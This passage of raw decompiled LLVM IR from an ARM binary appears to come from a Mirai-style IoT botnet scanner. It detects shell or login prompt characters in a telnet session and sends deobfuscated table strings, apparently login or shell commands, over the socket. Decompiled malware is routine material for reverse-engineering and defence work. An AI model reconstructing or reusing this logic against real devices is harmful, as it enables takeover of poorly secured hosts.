  store i32 %v1_10cf4, i32* %r0.global-to-local, align 4
  %v0_10cf8 = load i32, i32* @r6, align 4
  %v1_10cf8 = add i32 %v0_10cf8, 540
  %v2_10cf8 = inttoptr i32 %v1_10cf8 to i8*
  %v3_10cf8 = load i8, i8* %v2_10cf8, align 1
  %v4_10cf8 = zext i8 %v3_10cf8 to i32
  %v1_10cfc = add nuw nsw i32 %v4_10cf8, 1
  %v1_10d00 = urem i32 %v1_10cfc, 256
  store i32 %v1_10d00, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10d08 = icmp ugt i32 %v1_10d00, 9
  store i1 %v2_10d08, i1* %cpsr_c.global-to-local, align 1
  %v7_10d08 = icmp eq i32 %v1_10d00, 10
  store i1 %v7_10d08, i1* %cpsr_z.global-to-local, align 1
  %v2_10d0c = add i32 %v0_10cf8, 4
  %v3_10d0c = inttoptr i32 %v2_10d0c to i32*
  store i32 -1, i32* %v3_10d0c, align 4
  %v0_10d10 = load i32, i32* @r3, align 4
  %v1_10d10 = trunc i32 %v0_10d10 to i8
  %v2_10d10 = load i32, i32* @r6, align 4
  %v3_10d10 = add i32 %v2_10d10, 540
  %v4_10d10 = inttoptr i32 %v3_10d10 to i8*
  store i8 %v1_10d10, i8* %v4_10d10, align 1
  %v0_10d14 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10d14, label %dec_label_pc_10d18, label %dec_label_pc_116c8

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10ce8
  store i32 0, i32* @r3, align 4
  %v1_10d1c = load i32, i32* @r6, align 4
  %v2_10d1c = add i32 %v1_10d1c, 12
  %v3_10d1c = inttoptr i32 %v2_10d1c to i32*
  store i32 0, i32* %v3_10d1c, align 4
  %v0_10d20 = load i32, i32* @r3, align 4
  %v1_10d20 = trunc i32 %v0_10d20 to i8
  %v2_10d20 = load i32, i32* @r6, align 4
  %v3_10d20 = add i32 %v2_10d20, 540
  %v4_10d20 = inttoptr i32 %v3_10d20 to i8*
  store i8 %v1_10d20, i8* %v4_10d20, align 1
  br label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %dec_label_pc_116c8, %dec_label_pc_10d18
  store i32 -1, i32* @r8, align 4
  br label %dec_label_pc_10d28

dec_label_pc_10d28:                               ; preds = %dec_label_pc_11334, %dec_label_pc_1123c, %dec_label_pc_11168, %dec_label_pc_11094, %dec_label_pc_10fc0, %dec_label_pc_10dcc, %dec_label_pc_10d24
  %v0_10d28 = load i32, i32* @r6, align 4
  %v1_10d28 = add i32 %v0_10d28, 24
  %v2_10d28 = inttoptr i32 %v1_10d28 to i32*
  %v3_10d28 = load i32, i32* %v2_10d28, align 4
  %v0_10d2c = load i32, i32* @r8, align 4
  %v2_10d2c = sub i32 %v0_10d2c, %v3_10d28
  %v3_10d2c = icmp uge i32 %v0_10d2c, %v3_10d28
  store i1 %v3_10d2c, i1* %cpsr_c.global-to-local, align 1
  %v4_10d2c = xor i32 %v0_10d2c, %v3_10d28
  %v5_10d2c = xor i32 %v2_10d2c, %v0_10d2c
  %v6_10d2c = and i32 %v5_10d2c, %v4_10d2c
  %v7_10d2c = icmp slt i32 %v6_10d2c, 0
  %v8_10d2c = icmp slt i32 %v2_10d2c, 0
  %v9_10d2c = icmp eq i32 %v0_10d2c, %v3_10d28
  store i1 %v9_10d2c, i1* %cpsr_z.global-to-local, align 1
  %v2_10d30 = xor i1 %v8_10d2c, %v7_10d2c
  %v0_10d2c.v3_10d28 = select i1 %v2_10d30, i32 %v0_10d2c, i32 %v3_10d28
  store i32 %v0_10d2c.v3_10d28, i32* %r1.global-to-local, align 4
  %v2_10d38 = sub i32 %v3_10d28, %v0_10d2c.v3_10d28
  store i32 %v2_10d38, i32* @r2, align 4
  store i32 %v2_10d38, i32* %v2_10d28, align 4
  %v0_10d40 = load i32, i32* @fp, align 4
  %v1_10d40 = load i32, i32* %r1.global-to-local, align 4
  %v2_10d40 = add i32 %v1_10d40, %v0_10d40
  store i32 %v2_10d40, i32* @r1, align 4
  store i32 %v0_10d40, i32* @r0, align 4
  %v3_10d48 = call i32 @memmove(i32 %v0_10d40, i32 %v2_10d40, i32 %v2_10d38)
  store i32 %v3_10d48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c0c

dec_label_pc_10d50:                               ; preds = %dec_label_pc_10c0c
  %v1_10d50 = add i32 %v0_10c0c, 24
  %v2_10d50 = inttoptr i32 %v1_10d50 to i32*
  %v3_10d50 = load i32, i32* %v2_10d50, align 4
  store i32 %v3_10d50, i32* %r2.global-to-local, align 4
  %v1_10d54 = add i32 %v3_10d50, -1
  store i32 %v1_10d54, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d58 = icmp eq i32 %v1_10d54, 0
  store i1 %v2_10d58, i1* %cpsr_z.global-to-local, align 1
  %tmp386 = icmp slt i32 %v1_10d54, 1
  br i1 %tmp386, label %dec_label_pc_10b8cthread-pre-split.thread, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d50
  %v2_10d60 = add i32 %v1_10d54, %v0_10c0c
  store i32 %v2_10d60, i32* %r3.global-to-local, align 4
  %v1_10d64 = add i32 %v2_10d60, 28
  %v2_10d64 = inttoptr i32 %v1_10d64 to i8*
  %v3_10d64 = load i8, i8* %v2_10d64, align 1
  %v4_10d64 = zext i8 %v3_10d64 to i32
  store i32 %v4_10d64, i32* %r3.global-to-local, align 4
  %v2_10d68 = icmp ugt i8 %v3_10d64, 61
  store i1 %v2_10d68, i1* %cpsr_c.global-to-local, align 1
  %v7_10d68 = icmp eq i8 %v3_10d64, 62
  store i1 %v7_10d68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d68, label %dec_label_pc_10dcc, label %bb387

bb387:                                            ; preds = %dec_label_pc_10d60
  %v3_10d6c = icmp ugt i8 %v3_10d64, 57
  store i1 %v3_10d6c, i1* %cpsr_c.global-to-local, align 1
  %v8_10d6c = icmp eq i8 %v3_10d64, 58
  store i1 %v8_10d6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10d6c, label %dec_label_pc_10dcc, label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %bb387
  %v2_10d74 = icmp ugt i8 %v3_10d64, 35
  store i1 %v2_10d74, i1* %cpsr_c.global-to-local, align 1
  %v7_10d74 = icmp eq i8 %v3_10d64, 36
  store i1 %v7_10d74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d74, label %dec_label_pc_10dcc, label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d74
  %v2_10d7c = icmp ugt i8 %v3_10d64, 34
  store i1 %v2_10d7c, i1* %cpsr_c.global-to-local, align 1
  %v7_10d7c = icmp eq i8 %v3_10d64, 35
  store i1 %v7_10d7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d7c, label %dec_label_pc_10dcc, label %dec_label_pc_10d84

dec_label_pc_10d84:                               ; preds = %dec_label_pc_10d7c
  %v2_10d84 = icmp ugt i8 %v3_10d64, 36
  store i1 %v2_10d84, i1* %cpsr_c.global-to-local, align 1
  %v7_10d84 = icmp eq i8 %v3_10d64, 37
  store i1 %v7_10d84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d84, label %dec_label_pc_10dcc, label %dec_label_pc_10db4.preheader

dec_label_pc_10db4.preheader:                     ; preds = %dec_label_pc_10d84
  %v3_10d88 = add i32 %v0_10c0c, 28
  %v2_10d8c = add i32 %v3_10d88, %v3_10d50
  store i32 %v2_10d8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10db4

dec_label_pc_10d98:                               ; preds = %bb388
  %v2_10d98 = icmp ugt i8 %v3_10dbc, 35
  store i1 %v2_10d98, i1* %cpsr_c.global-to-local, align 1
  %v7_10d98 = icmp eq i8 %v3_10dbc, 36
  store i1 %v7_10d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d98, label %dec_label_pc_10dcc, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d98
  %v2_10da0 = icmp ugt i8 %v3_10dbc, 34
  store i1 %v2_10da0, i1* %cpsr_c.global-to-local, align 1
  %v7_10da0 = icmp eq i8 %v3_10dbc, 35
  store i1 %v7_10da0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10da0, label %dec_label_pc_10dcc, label %dec_label_pc_10da8

dec_label_pc_10da8:                               ; preds = %dec_label_pc_10da0
  %v2_10da8 = icmp ugt i8 %v3_10dbc, 36
  store i1 %v2_10da8, i1* %cpsr_c.global-to-local, align 1
  %v7_10da8 = icmp eq i8 %v3_10dbc, 37
  store i1 %v7_10da8, i1* %cpsr_z.global-to-local, align 1
  %v1_10dac = add i32 %v0_10dac, -1
  store i32 %v1_10dac, i32* %r3.global-to-local, align 4
  br i1 %v7_10da8, label %dec_label_pc_10dcc, label %dec_label_pc_10db4

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10db4.preheader, %dec_label_pc_10da8
  %v0_10dac = phi i32 [ %v2_10d8c, %dec_label_pc_10db4.preheader ], [ %v1_10dac, %dec_label_pc_10da8 ]
  %v0_10db4 = phi i32 [ %v1_10d54, %dec_label_pc_10db4.preheader ], [ %v1_10db4, %dec_label_pc_10da8 ]
  %v1_10db4 = add i32 %v0_10db4, -1
  store i32 %v1_10db4, i32* %r1.global-to-local, align 4
  %v2_10db4 = icmp ne i32 %v0_10db4, 0
  store i1 %v2_10db4, i1* %cpsr_c.global-to-local, align 1
  %v7_10db4 = icmp eq i32 %v0_10db4, 1
  store i1 %v7_10db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10db4, label %dec_label_pc_10b8cthread-pre-split.thread514, label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10db4
  %v1_10dbc = add i32 %v0_10dac, -2
  %v2_10dbc = inttoptr i32 %v1_10dbc to i8*
  %v3_10dbc = load i8, i8* %v2_10dbc, align 1
  %v4_10dbc = zext i8 %v3_10dbc to i32
  store i32 %v4_10dbc, i32* %r2.global-to-local, align 4
  %v2_10dc0 = icmp ugt i8 %v3_10dbc, 61
  store i1 %v2_10dc0, i1* %cpsr_c.global-to-local, align 1
  %v7_10dc0 = icmp eq i8 %v3_10dbc, 62
  store i1 %v7_10dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10dc0, label %dec_label_pc_10dcc, label %bb388

bb388:                                            ; preds = %dec_label_pc_10dbc
  %v3_10dc4 = icmp ugt i8 %v3_10dbc, 57
  store i1 %v3_10dc4, i1* %cpsr_c.global-to-local, align 1
  %v8_10dc4 = icmp eq i8 %v3_10dbc, 58
  store i1 %v8_10dc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10dc4, label %dec_label_pc_10dcc, label %dec_label_pc_10d98

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10dbc, %bb388, %dec_label_pc_10da8, %dec_label_pc_10da0, %dec_label_pc_10d98, %dec_label_pc_10d84, %dec_label_pc_10d60, %dec_label_pc_10d7c, %dec_label_pc_10d74, %bb387
  %v0_10dd0 = phi i32 [ %v1_10d54, %dec_label_pc_10d84 ], [ %v1_10d54, %dec_label_pc_10d60 ], [ %v1_10d54, %dec_label_pc_10d7c ], [ %v1_10d54, %dec_label_pc_10d74 ], [ %v1_10d54, %bb387 ], [ %v1_10db4, %dec_label_pc_10d98 ], [ %v1_10db4, %dec_label_pc_10da0 ], [ %v1_10db4, %dec_label_pc_10da8 ], [ %v1_10db4, %bb388 ], [ %v1_10db4, %dec_label_pc_10dbc ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10dd0 = add i32 %v0_10dd0, 1
  store i32 %v1_10dd0, i32* @r8, align 4
  %v1_10dd4 = call i32 @table_unlock_val(i32 24)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10de4 = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10de4, i32* %r0.global-to-local, align 4
  %v3_10de8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10de8, i32* %r2.global-to-local, align 4
  store i32 %v3_10de4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10df4 = load i32, i32* @r6, align 4
  %v1_10df4 = add i32 %v0_10df4, 4
  %v2_10df4 = inttoptr i32 %v1_10df4 to i32*
  %v3_10df4 = load i32, i32* %v2_10df4, align 4
  store i32 %v3_10df4, i32* %r0.global-to-local, align 4
  %v4_10df8 = call i32 @__libc_send(i32 %v3_10df4, i32 %v3_10de4, i32 %v3_10de8, i32 16384)
  store i32 %v4_10df8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10e08 = load i32, i32* @r6, align 4
  %v1_10e08 = add i32 %v0_10e08, 4
  %v2_10e08 = inttoptr i32 %v1_10e08 to i32*
  %v3_10e08 = load i32, i32* %v2_10e08, align 4
  store i32 %v3_10e08, i32* %r0.global-to-local, align 4
  %v4_10e0c = call i32 @__libc_send(i32 %v3_10e08, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10e14 = call i32 @table_lock_val(i32 24)
  store i32 %v1_10e14, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_10e1c = load i32, i32* @r6, align 4
  %v2_10e1c = add i32 %v1_10e1c, 12
  %v3_10e1c = inttoptr i32 %v2_10e1c to i32*
  store i32 10, i32* %v3_10e1c, align 4
  br label %dec_label_pc_10d28

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10c0c
  %v1_10e24 = add i32 %v0_10c0c, 24
  %v2_10e24 = inttoptr i32 %v1_10e24 to i32*
  %v3_10e24 = load i32, i32* %v2_10e24, align 4
  store i32 %v3_10e24, i32* %r2.global-to-local, align 4
  %v1_10e28 = add i32 %v3_10e24, -1
  store i32 %v1_10e28, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e2c = icmp eq i32 %v1_10e28, 0
  store i1 %v2_10e2c, i1* %cpsr_z.global-to-local, align 1
  %tmp389 = icmp slt i32 %v1_10e28, 1
  br i1 %tmp389, label %dec_label_pc_10b8cthread-pre-split.thread, label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e24
  %v2_10e34 = add i32 %v1_10e28, %v0_10c0c
  store i32 %v2_10e34, i32* %r3.global-to-local, align 4
  %v1_10e38 = add i32 %v2_10e34, 28
  %v2_10e38 = inttoptr i32 %v1_10e38 to i8*
  %v3_10e38 = load i8, i8* %v2_10e38, align 1
  %v4_10e38 = zext i8 %v3_10e38 to i32
  store i32 %v4_10e38, i32* %r3.global-to-local, align 4
  %v2_10e3c = icmp ugt i8 %v3_10e38, 61
  store i1 %v2_10e3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e3c = icmp eq i8 %v3_10e38, 62
  store i1 %v7_10e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e3c, label %dec_label_pc_10fc0, label %bb390

bb390:                                            ; preds = %dec_label_pc_10e34
  %v3_10e40 = icmp ugt i8 %v3_10e38, 57
  store i1 %v3_10e40, i1* %cpsr_c.global-to-local, align 1
  %v8_10e40 = icmp eq i8 %v3_10e38, 58
  store i1 %v8_10e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e40, label %dec_label_pc_10fc0, label %dec_label_pc_10e48

dec_label_pc_10e48:                               ; preds = %bb390
  %v2_10e48 = icmp ugt i8 %v3_10e38, 35
  store i1 %v2_10e48, i1* %cpsr_c.global-to-local, align 1
  %v7_10e48 = icmp eq i8 %v3_10e38, 36
  store i1 %v7_10e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e48, label %dec_label_pc_10fc0, label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e48
  %v2_10e50 = icmp ugt i8 %v3_10e38, 34
  store i1 %v2_10e50, i1* %cpsr_c.global-to-local, align 1
  %v7_10e50 = icmp eq i8 %v3_10e38, 35
  store i1 %v7_10e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e50, label %dec_label_pc_10fc0, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e50
  %v2_10e58 = icmp ugt i8 %v3_10e38, 36
  store i1 %v2_10e58, i1* %cpsr_c.global-to-local, align 1
  %v7_10e58 = icmp eq i8 %v3_10e38, 37
  store i1 %v7_10e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e58, label %dec_label_pc_10fc0, label %dec_label_pc_10fa8.preheader

dec_label_pc_10fa8.preheader:                     ; preds = %dec_label_pc_10e58
  %v3_10e5c = add i32 %v0_10c0c, 28
  %v2_10e60 = add i32 %v3_10e5c, %v3_10e24
  store i32 %v2_10e60, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10fa8

dec_label_pc_10f8c:                               ; preds = %bb391
  %v2_10f8c = icmp ugt i8 %v3_10fb0, 35
  store i1 %v2_10f8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f8c = icmp eq i8 %v3_10fb0, 36
  store i1 %v7_10f8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f8c, label %dec_label_pc_10fc0, label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f8c
  %v2_10f94 = icmp ugt i8 %v3_10fb0, 34
  store i1 %v2_10f94, i1* %cpsr_c.global-to-local, align 1
  %v7_10f94 = icmp eq i8 %v3_10fb0, 35
  store i1 %v7_10f94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f94, label %dec_label_pc_10fc0, label %dec_label_pc_10f9c

dec_label_pc_10f9c:                               ; preds = %dec_label_pc_10f94
  %v2_10f9c = icmp ugt i8 %v3_10fb0, 36
  store i1 %v2_10f9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f9c = icmp eq i8 %v3_10fb0, 37
  store i1 %v7_10f9c, i1* %cpsr_z.global-to-local, align 1
  %v1_10fa0 = add i32 %v0_10fa0, -1
  store i32 %v1_10fa0, i32* %r3.global-to-local, align 4
  br i1 %v7_10f9c, label %dec_label_pc_10fc0, label %dec_label_pc_10fa8

dec_label_pc_10fa8:                               ; preds = %dec_label_pc_10fa8.preheader, %dec_label_pc_10f9c
  %v0_10fa0 = phi i32 [ %v2_10e60, %dec_label_pc_10fa8.preheader ], [ %v1_10fa0, %dec_label_pc_10f9c ]
  %v0_10fa8 = phi i32 [ %v1_10e28, %dec_label_pc_10fa8.preheader ], [ %v1_10fa8, %dec_label_pc_10f9c ]
  %v1_10fa8 = add i32 %v0_10fa8, -1
  store i32 %v1_10fa8, i32* %r1.global-to-local, align 4
  %v2_10fa8 = icmp ne i32 %v0_10fa8, 0
  store i1 %v2_10fa8, i1* %cpsr_c.global-to-local, align 1
  %v7_10fa8 = icmp eq i32 %v0_10fa8, 1
  store i1 %v7_10fa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fa8, label %dec_label_pc_10b8cthread-pre-split.thread514, label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10fa8
  %v1_10fb0 = add i32 %v0_10fa0, -2
  %v2_10fb0 = inttoptr i32 %v1_10fb0 to i8*
  %v3_10fb0 = load i8, i8* %v2_10fb0, align 1
  %v4_10fb0 = zext i8 %v3_10fb0 to i32
  store i32 %v4_10fb0, i32* %r2.global-to-local, align 4
  %v2_10fb4 = icmp ugt i8 %v3_10fb0, 61
  store i1 %v2_10fb4, i1* %cpsr_c.global-to-local, align 1
  %v7_10fb4 = icmp eq i8 %v3_10fb0, 62
  store i1 %v7_10fb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10fb4, label %dec_label_pc_10fc0, label %bb391

bb391:                                            ; preds = %dec_label_pc_10fb0
  %v3_10fb8 = icmp ugt i8 %v3_10fb0, 57
  store i1 %v3_10fb8, i1* %cpsr_c.global-to-local, align 1
  %v8_10fb8 = icmp eq i8 %v3_10fb0, 58
  store i1 %v8_10fb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10fb8, label %dec_label_pc_10fc0, label %dec_label_pc_10f8c

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb0, %bb391, %dec_label_pc_10f9c, %dec_label_pc_10f94, %dec_label_pc_10f8c, %dec_label_pc_10e58, %dec_label_pc_10e34, %dec_label_pc_10e50, %dec_label_pc_10e48, %bb390
  %v0_10fc4 = phi i32 [ %v1_10e28, %dec_label_pc_10e58 ], [ %v1_10e28, %dec_label_pc_10e34 ], [ %v1_10e28, %dec_label_pc_10e50 ], [ %v1_10e28, %dec_label_pc_10e48 ], [ %v1_10e28, %bb390 ], [ %v1_10fa8, %dec_label_pc_10f8c ], [ %v1_10fa8, %dec_label_pc_10f94 ], [ %v1_10fa8, %dec_label_pc_10f9c ], [ %v1_10fa8, %bb391 ], [ %v1_10fa8, %dec_label_pc_10fb0 ]
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10fc4 = add i32 %v0_10fc4, 1
  store i32 %v1_10fc4, i32* @r8, align 4
  %v1_10fc8 = call i32 @table_unlock_val(i32 20)
  store i32 %v2_1124c, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_10fd8 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-60)
  store i32 %v3_10fd8, i32* %r0.global-to-local, align 4
  %v3_10fdc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10fdc, i32* %r2.global-to-local, align 4
  store i32 %v3_10fd8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10fe8 = load i32, i32* @r6, align 4
  %v1_10fe8 = add i32 %v0_10fe8, 4
  %v2_10fe8 = inttoptr i32 %v1_10fe8 to i32*
  %v3_10fe8 = load i32, i32* %v2_10fe8, align 4
  store i32 %v3_10fe8, i32* %r0.global-to-local, align 4
  %v4_10fec = call i32 @__libc_send(i32 %v3_10fe8, i32 %v3_10fd8, i32 %v3_10fdc, i32 16384)
  store i32 %v4_10fec, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10ffc = load i32, i32* @r6, align 4
  %v1_10ffc = add i32 %v0_10ffc, 4
  %v2_10ffc = inttoptr i32 %v1_10ffc to i32*
  %v3_10ffc = load i32, i32* %v2_10ffc, align 4
  store i32 %v3_10ffc, i32* %r0.global-to-local, align 4
  %v4_11000 = call i32 @__libc_send(i32 %v3_10ffc, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_11008 = call i32 @table_lock_val(i32 20)
  store i32 %v1_11008, i32* %r0.global-to-local, align 4
  store i32 8, i32* @r3, align 4
  %v1_11010 = load i32, i32* @r6, align 4
  %v2_11010 = add i32 %v1_11010, 12
  %v3_11010 = inttoptr i32 %v2_11010 to i32*
  store i32 8, i32* %v3_11010, align 4
  br label %dec_label_pc_10d28

dec_label_pc_11018:                               ; preds = %dec_label_pc_10c0c
  %v1_11018 = add i32 %v0_10c0c, 24
  %v2_11018 = inttoptr i32 %v1_11018 to i32*
  %v3_11018 = load i32, i32* %v2_11018, align 4
  store i32 %v3_11018, i32* %r2.global-to-local, align 4
  %v1_1101c = add i32 %v3_11018, -1
  store i32 %v1_1101c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11020 = icmp eq i32 %v1_1101c, 0
  store i1 %v2_11020, i1* %cpsr_z.global-to-local, align 1
  %tmp392 = icmp slt i32 %v1_1101c, 1
  br i1 %tmp392, label %dec_label_pc_10b8cthread-pre-split.thread, label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_11018
  %v2_11028 = add i32 %v1_1101c, %v0_10c0c
  store i32 %v2_11028, i32* %r3.global-to-local, align 4
  %v1_1102c = add i32 %v2_11028, 28
  %v2_1102c = inttoptr i32 %v1_1102c to i8*
  %v3_1102c = load i8, i8* %v2_1102c, align 1
  %v4_1102c = zext i8 %v3_1102c to i32
  store i32 %v4_1102c, i32* %r3.global-to-local, align 4
  %v2_11030 = icmp ugt i8 %v3_1102c, 61
  store i1 %v2_11030, i1* %cpsr_c.global-to-local, align 1
  %v7_11030 = icmp eq i8 %v3_1102c, 62
  store i1 %v7_11030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11030, label %dec_label_pc_11094, label %bb393

bb393:                                            ; preds = %dec_label_pc_11028
  %v3_11034 = icmp ugt i8 %v3_1102c, 57
  store i1 %v3_11034, i1* %cpsr_c.global-to-local, align 1
  %v8_11034 = icmp eq i8 %v3_1102c, 58
  store i1 %v8_11034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11034, label %dec_label_pc_11094, label %dec_label_pc_1103c

dec_label_pc_1103c:                               ; preds = %bb393
  %v2_1103c = icmp ugt i8 %v3_1102c, 35
  store i1 %v2_1103c, i1* %cpsr_c.global-to-local, align 1
  %v7_1103c = icmp eq i8 %v3_1102c, 36
  store i1 %v7_1103c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1103c, label %dec_label_pc_11094, label %dec_label_pc_11044

dec_label_pc_11044:                               ; preds = %dec_label_pc_1103c
  %v2_11044 = icmp ugt i8 %v3_1102c, 34
  store i1 %v2_11044, i1* %cpsr_c.global-to-local, align 1
  %v7_11044 = icmp eq i8 %v3_1102c, 35
  store i1 %v7_11044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11044, label %dec_label_pc_11094, label %dec_label_pc_1104c

dec_label_pc_1104c:                               ; preds = %dec_label_pc_11044
  %v2_1104c = icmp ugt i8 %v3_1102c, 36
  store i1 %v2_1104c, i1* %cpsr_c.global-to-local, align 1
  %v7_1104c = icmp eq i8 %v3_1102c, 37
  store i1 %v7_1104c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1104c, label %dec_label_pc_11094, label %dec_label_pc_1107c.preheader

dec_label_pc_1107c.preheader:                     ; preds = %dec_label_pc_1104c
  %v3_11050 = add i32 %v0_10c0c, 28
  %v2_11054 = add i32 %v3_11050, %v3_11018
  store i32 %v2_11054, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1107c

dec_label_pc_11060:                               ; preds = %bb394
  %v2_11060 = icmp ugt i8 %v3_11084, 35
  store i1 %v2_11060, i1* %cpsr_c.global-to-local, align 1
  %v7_11060 = icmp eq i8 %v3_11084, 36
  store i1 %v7_11060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11060, label %dec_label_pc_11094, label %dec_label_pc_11068

dec_label_pc_11068:                               ; preds = %dec_label_pc_11060
  %v2_11068 = icmp ugt i8 %v3_11084, 34
  store i1 %v2_11068, i1* %cpsr_c.global-to-local, align 1
  %v7_11068 = icmp eq i8 %v3_11084, 35
  store i1 %v7_11068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11068, label %dec_label_pc_11094, label %dec_label_pc_11070

dec_label_pc_11070:                               ; preds = %dec_label_pc_11068
  %v2_11070 = icmp ugt i8 %v3_11084, 36
  store i1 %v2_11070, i1* %cpsr_c.global-to-local, align 1
  %v7_11070 = icmp eq i8 %v3_11084, 37
  store i1 %v7_11070, i1* %cpsr_z.global-to-local, align 1
  %v1_11074 = add i32 %v0_11074, -1
  store i32 %v1_11074, i32* %r3.global-to-local, align 4
  br i1 %v7_11070, label %dec_label_pc_11094, label %dec_label_pc_1107c

dec_label_pc_1107c:                               ; preds = %dec_label_pc_1107c.preheader, %dec_label_pc_11070
  %v0_11074 = phi i32 [ %v2_11054, %dec_label_pc_1107c.preheader ], [ %v1_11074, %dec_label_pc_11070 ]
  %v0_1107c = phi i32 [ %v1_1101c, %dec_label_pc_1107c.preheader ], [ %v1_1107c, %dec_label_pc_11070 ]
  %v1_1107c = add i32 %v0_1107c, -1
  store i32 %v1_1107c, i32* %r1.global-to-local, align 4
  %v2_1107c = icmp ne i32 %v0_1107c, 0
  store i1 %v2_1107c, i1* %cpsr_c.global-to-local, align 1
  %v7_1107c = icmp eq i32 %v0_1107c, 1
  store i1 %v7_1107c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1107c, label %dec_label_pc_10b8cthread-pre-split.thread514, label %dec_label_pc_11084

dec_label_pc_11084:                               ; preds = %dec_label_pc_1107c
  %v1_11084 = add i32 %v0_11074, -2
  %v2_11084 = inttoptr i32 %v1_11084 to i8*
  %v3_11084 = load i8, i8* %v2_11084, align 1
  %v4_11084 = zext i8 %v3_11084 to i32
  store i32 %v4_11084, i32* %r2.global-to-local, align 4
  %v2_11088 = icmp ugt i8 %v3_11084, 61
  store i1 %v2_11088, i1* %cpsr_c.global-to-local, align 1
  %v7_11088 = icmp eq i8 %v3_11084, 62
  store i1 %v7_11088, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11088, label %dec_label_pc_11094, label %bb394

bb394:                                            ; preds = %dec_label_pc_11084
  %v3_1108c = icmp ugt i8 %v3_11084, 57
  store i1 %v3_1108c, i1* %cpsr_c.global-to-local, align 1
